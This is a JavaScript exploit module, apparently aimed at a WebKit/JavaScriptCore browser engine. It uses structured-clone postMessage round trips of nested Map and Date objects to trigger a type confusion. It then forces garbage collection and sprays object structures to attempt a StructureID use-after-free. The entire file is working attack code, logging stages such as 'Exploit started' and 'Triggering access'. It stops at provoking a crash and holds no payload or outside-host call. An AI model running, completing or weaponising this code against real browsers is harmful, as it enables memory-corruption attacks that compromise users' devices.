import { debug_log } from './module/utils.mjs';
import { Int } from './module/int64.mjs';

// Helper to make the screen output visible and scrollable if needed
// forcing some styles if they aren't there, although utils.mjs appends to body.
 
function sleep(ms = 0) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
 
function gc() {
    new Uint8Array(4 * 1024 * 1024);
}

function sprayStructures() {
    const keepers = [];
    for (let i = 0; i < 50000; i++) {
        let o = {a: 1};
        o['p' + i] = i; 
        keepers.push(o);
    }
    return keepers;
}
 
function createObjectStructure(num_elems) {
    let root = new Map();
    let msg = root;
    let foo = [];

    // Markers to identify the confusion
    for (let i = 0; i < 100; i++) {
        foo.push(new Date(0xffff));
    }

    for (let i = 0; i < num_elems; i++) {
        const d = new Date(i);
        const map = new Map();
        msg.set(d, [map, foo]);
        msg = map;
    }

    return root;
}
 
export async function main() {
    debug_log("[*] Exploit started using module imports...");
    
    const num_elems = 1600;
    let root = createObjectStructure(num_elems);
    let msg = root;
    let data2 = null;
    let idx = null;
    let attempts = 0;

    debug_log("[*] Starting Stage 1: Triggering Logic Error...");

    while (true) {
        attempts++;
        if (attempts % 100 === 0) debug_log("[*] Attempt " + attempts);

        let data = null;
        const prom = new Promise(resolve => {
            addEventListener('message', event => {
                data = event;
                resolve();
            }, { once: true });
        });

        postMessage(msg, origin);
        await prom;
        data = data.data;

        gc();
        await sleep();

        let i;
        try {
            for (i = 0; i < num_elems; i++) {
                if (data.keys().next().value.getTime() === 0xffff) {
                    idx = i;
                    break;
                }
                data = data.values().next().value[0];
            }
        } catch {
            idx = i;
            data2 = data.keys().next().value;
            break;
        }
    }

    debug_log('[+] Stage 1 Triggered! Confused object found at idx: ' + idx);
    
    if (data2) {
        debug_log("[*] Starting Stage 2: StructureID UAF...");
        
        // 1. Release references
        root = null;
        msg = null;
        
        // 2. Freeing
        debug_log('[*] Freeing original structures...');
        // Execute multiple GCs to ensure the old structure is collected
        for (let k = 0; k < 100; k++) {
            gc();
        }
        await sleep(100);

        // 3. Spray
        debug_log('[*] Churning StructureIDTable...');
        let keepers = sprayStructures();

        // 4. Trigger
        debug_log('[!] Triggering access...');
        try {
            // This toString should trigger the crash or return garbage if UAF worked
            let val = data2.toString();
            debug_log('[?] Object toString result: ' + val);
            

            debug_log('[+] Exploit finished loop without crash.');
        } catch (e) {
            debug_log('[!] Crash/Exception: ' + e);
        }
    } else {
        debug_log("[-] Failed to get confused object.");
    }
}
